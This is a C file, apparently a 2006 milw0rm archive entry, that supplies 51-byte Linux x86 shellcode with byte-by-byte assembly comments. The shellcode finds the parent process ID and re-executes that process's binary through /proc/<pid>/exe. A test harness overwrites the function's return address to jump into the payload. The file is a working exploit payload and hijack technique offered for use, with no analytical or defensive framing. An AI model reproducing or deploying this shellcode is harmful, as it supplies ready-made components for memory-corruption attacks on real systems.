/*
 * (linux/x86) getppid() + execve("/proc/<pid>/exe", ["/proc/<pid>/exe", NULL]) - 51 bytes
 * - izik <izik@tty64.org>
 */

char shellcode[] =

	"\x6a\x40"              // push $0x40
	"\x58"                  // pop %eax
	"\xcd\x80"              // int $0x80

	//
	// <_convert>:
	//

	"\x4c"                  // dec %esp
	"\x99"                  // cltd
	"\x6a\x0a"              // push $0xa
	"\x5b"                  // pop %ebx
	"\xf7\xf3"              // div %ebx
	"\x80\xc2\x30"          // add $0x30,%dl
	"\x88\x14\x24"          // mov %dl,(%esp)
	"\x85\xc0"              // test %eax,%eax
	"\x75\xef"              // jnz _convert
	"\x99"                  // cltd
	"\x5b"                  // pop %ebx
	"\x52"                  // push %edx
	"\x68\x2f\x65\x78\x65"  // push $0x6578652f
	"\x53"                  // push %ebx
	"\x68\x72\x6f\x63\x2f"  // push $0x2f636f72
	"\x68\x2f\x2f\x2f\x70"  // push $0x702f2f2f
	"\xb0\x0b"              // mov $0xb,%al
	"\x89\xe3"              // mov %esp,%ebx
	"\x52"                  // push %edx
	"\x53"                  // push %ebx
	"\x89\xe1"              // mov %esp,%ecx
	"\xcd\x80";             // int $0x80

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}

// milw0rm.com [2006-01-21]